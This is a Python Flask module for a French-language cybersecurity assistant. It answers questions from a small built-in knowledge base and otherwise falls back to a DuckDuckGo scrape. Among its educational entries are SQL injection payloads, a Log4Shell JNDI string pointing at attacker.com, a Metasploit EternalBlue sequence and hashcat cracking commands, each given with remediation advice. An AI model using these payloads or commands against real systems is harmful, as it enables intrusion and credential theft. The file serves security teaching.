"""
PySecOps — Assistant Cybersécurité
Recherche sur DuckDuckGo + base de connaissances locale.
"""
from flask import Blueprint, render_template, request, jsonify
from app.utils.db_utils import enregistrer
import requests
import re
import urllib.parse

assistant_bp = Blueprint('assistant', __name__)

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

CONNAISSANCES = {
    r"xss|cross.site.script": {
        "titre": "XSS — Cross-Site Scripting",
        "reponse": "Injection de JavaScript malveillant dans une page web.\n\n**Types :**\n- Réfléchi : payload dans l'URL\n- Stocké : payload en base de données\n- DOM : manipulation côté client\n\n**Protection :**\n- Échapper les entrées (htmlspecialchars)\n- Content Security Policy (CSP)\n- Flag httpOnly sur les cookies",
        "categorie": "Attaque Web",
        "lien": "https://owasp.org/www-community/attacks/xss/"
    },
    r"sql.inject|sqli|injection sql": {
        "titre": "Injection SQL",
        "reponse": "Insertion de code SQL malveillant pour manipuler la base de données.\n\n**Exemple :**\n```\nadmin OR 1=1 --\nUNION SELECT username,password FROM users --\n```\n\n**Protection :**\n- Requêtes préparées (PDO, PreparedStatement)\n- ORM (SQLAlchemy)\n- Validation des entrées",
        "categorie": "Attaque Web",
        "lien": "https://owasp.org/www-community/attacks/SQL_Injection"
    },
    r"log4shell|log4j|cve-2021-44228": {
        "titre": "Log4Shell — CVE-2021-44228 (CVSS 10.0)",
        "reponse": "Vulnérabilité critique dans Log4j2 permettant une RCE via JNDI lookup.\n\n**Payload :**\n```\n${jndi:ldap://attacker.com:1389/exploit}\n```\n\n**Correction :**\n- Mettre à jour Log4j2 vers 2.17.1+\n- Désactiver JNDI lookups",
        "categorie": "CVE Critique",
        "lien": "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
    },
    r"nmap|scanner.*port|port.*scan": {
        "titre": "Nmap — Scanner réseau",
        "reponse": "**Commandes essentielles :**\n\n```bash\nnmap -sV -sC 192.168.1.1\nnmap -p- --min-rate 5000 192.168.1.1\nnmap -sU --top-ports 100 192.168.1.1\nnmap -O 192.168.1.1\nnmap --script vuln 192.168.1.1\n```",
        "categorie": "Outils",
        "lien": "https://nmap.org/book/man.html"
    },
    r"metasploit|msf|msfconsole": {
        "titre": "Metasploit Framework",
        "reponse": "**Commandes de base :**\n\n```bash\nmsfconsole\nmsf> search eternalblue\nmsf> use exploit/windows/smb/ms17_010_eternalblue\nmsf> set RHOSTS 192.168.1.100\nmsf> set LHOST 192.168.1.50\nmsf> exploit\n```",
        "categorie": "Outils",
        "lien": "https://docs.metasploit.com/"
    },
    r"burp|burp suite|proxy.*http": {
        "titre": "Burp Suite — Proxy HTTP",
        "reponse": "**Modules essentiels :**\n\n- Proxy : intercepte les requêtes HTTP\n- Repeater : rejoue et modifie les requêtes\n- Intruder : attaques automatisées\n- Scanner : détection auto de vulnérabilités\n- Decoder : encode/décode Base64, URL, Hex\n\n**Workflow :** Proxy → Intercept → Send to Repeater → Tester",
        "categorie": "Outils",
        "lien": "https://portswigger.net/burp/documentation"
    },
    r"osint|reconnaissance passive": {
        "titre": "OSINT — Open Source Intelligence",
        "reponse": "**Sources gratuites :**\n\n```\ncrt.sh       → sous-domaines via certificats SSL\nShodan.io    → services exposés sur internet\nHunter.io    → emails professionnels\nSpiderFoot   → OSINT automatisé complet\nRecon-ng     → framework OSINT modulaire\n```\n\n**Règle :** zéro contact direct avec la cible en phase passive.",
        "categorie": "Reconnaissance",
        "lien": "https://osintframework.com/"
    },
    r"owasp|top 10|top10": {
        "titre": "OWASP Top 10 — 2021",
        "reponse": "**Les 10 risques les plus critiques :**\n\n1. A01 — Broken Access Control\n2. A02 — Cryptographic Failures\n3. A03 — Injection (SQL, XSS, SSTI)\n4. A04 — Insecure Design\n5. A05 — Security Misconfiguration\n6. A06 — Vulnerable Components\n7. A07 — Auth Failures\n8. A08 — Integrity Failures\n9. A09 — Logging Failures\n10. A10 — SSRF\n\nSource : owasp.org/Top10",
        "categorie": "Standards",
        "lien": "https://owasp.org/Top10/"
    },
    r"hashcat|cracker.*hash|hash.*crack": {
        "titre": "Hashcat — Cracking de hashes",
        "reponse": "**Commandes essentielles :**\n\n```bash\nhashcat -m 0 -a 0 hash.txt wordlist.txt\nhashcat -m 1000 -a 0 hash.txt wordlist.txt\nhashcat -m 3200 -a 0 hash.txt wordlist.txt\nhashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a?a?a\n```\n\n**Types :** MD5=0, SHA1=100, SHA256=1400, NTLM=1000, bcrypt=3200",
        "categorie": "Outils",
        "lien": "https://hashcat.net/wiki/"
    },
    r"pentest|test.*intrusion|methodolog": {
        "titre": "Méthodologie Pentest — PTES",
        "reponse": "**7 phases PTES :**\n\n1. Pre-engagement — périmètre, autorisation\n2. Intelligence Gathering — OSINT passif\n3. Threat Modeling — actifs critiques\n4. Vulnerability Analysis — scanners + tests manuels\n5. Exploitation — PoC contrôlés\n6. Post-Exploitation — élévation, mouvement latéral\n7. Reporting — findings + CVSS + remédiation",
        "categorie": "Méthodologie",
        "lien": "http://www.pentest-standard.org/"
    },
    r"ransomware|rançon|chiffr.*fichier": {
        "titre": "Ransomware — Analyse et protection",
        "reponse": "**Comment ça fonctionne :**\n1. Infection (phishing, RDP exposé)\n2. Reconnaissance réseau\n3. Exfiltration des données\n4. Chiffrement AES-256 + RSA\n5. Demande de rançon\n\n**Protection :**\n- Sauvegardes 3-2-1\n- Patch management régulier\n- MFA sur tous les accès distants\n- EDR sur les postes\n- Segmentation réseau",
        "categorie": "Malware",
        "lien": "https://www.cisa.gov/stopransomware"
    },
    r"sha256|sha-256|hachage|hash.*type": {
        "titre": "Fonctions de hachage cryptographique",
        "reponse": "**Algorithmes par usage :**\n\n```\nMD5 (32 hex)     → obsolète, ne pas utiliser pour mots de passe\nSHA1 (40 hex)    → vulnérable aux collisions\nSHA256 (64 hex)  → standard actuel\nSHA512 (128 hex) → haute sécurité\nbcrypt           → mots de passe\nArgon2           → mots de passe (recommandé 2024)\n```",
        "categorie": "Cryptographie",
        "lien": "https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html"
    },
}

REPONSE_DEFAUT = {
    "titre":    "Recherche en cours...",
    "reponse":  "Je cherche des informations sur ce sujet.",
    "categorie": "Recherche",
    "lien":     "",
}


def rechercher_ddg(question: str) -> dict:
    """Cherche sur DuckDuckGo HTML (gratuit, sans clé)."""
    try:
        query = "cybersécurité " + question
        url   = "https://html.duckduckgo.com/html/?q=" + urllib.parse.quote(query)
        r     = requests.get(url, headers=HEADERS, timeout=8)

        snippets = re.findall(
            r'class="result__snippet"[^>]*>(.*?)</a>',
            r.text, re.DOTALL
        )[:4]

        liens_raw = re.findall(
            r'class="result__a"[^>]*href="([^"]+)"[^>]*>(.*?)</a>',
            r.text, re.DOTALL
        )[:4]

        texte_propre = []
        for s in snippets:
            s = re.sub(r'<[^>]+>', '', s).strip()
            if len(s) > 30:
                texte_propre.append(s)

        liens = []
        for href, titre in liens_raw:
            titre = re.sub(r'<[^>]+>', '', titre).strip()
            if titre and href:
                liens.append({"titre": titre[:60], "url": href})

        if texte_propre:
            reponse = "**Résultats de recherche pour : " + question + "**\n\n"
            for i, snippet in enumerate(texte_propre[:3], 1):
                reponse += str(i) + ". " + snippet + "\n\n"
            if liens:
                reponse += "\n**Sources :**\n"
                for lien in liens[:3]:
                    reponse += "- [" + lien["titre"] + "](" + lien["url"] + ")\n"
            return {
                "titre":    "Recherche : " + question,
                "reponse":  reponse,
                "categorie":"Recherche Web",
                "lien":     liens[0]["url"] if liens else "",
            }
    except Exception:
        pass

    return {
        "titre":    question,
        "reponse":  "Recherche indisponible. Consultez directement :\n- [Google](https://www.google.com/search?q=cybersecurite+" + urllib.parse.quote(question) + ")\n- [OWASP](https://owasp.org)\n- [NVD NIST](https://nvd.nist.gov)",
        "categorie":"Aide",
        "lien":     "https://www.google.com/search?q=cybersecurite+" + urllib.parse.quote(question),
    }


def repondre(question: str) -> dict:
    """Base locale d'abord, puis DuckDuckGo."""
    q = question.lower().strip()
    for pattern, rep in CONNAISSANCES.items():
        if re.search(pattern, q, re.IGNORECASE):
            return rep
    return rechercher_ddg(question)


@assistant_bp.route('/assistant')
def assistant():
    return render_template('assistant.html', active='assistant')


@assistant_bp.route('/api/assistant', methods=['POST'])
def api_assistant():
    question = request.json.get('question', '').strip()
    if not question:
        return jsonify({"erreur": "Question vide."})
    enregistrer("assistant", question[:50])
    return jsonify(repondre(question))
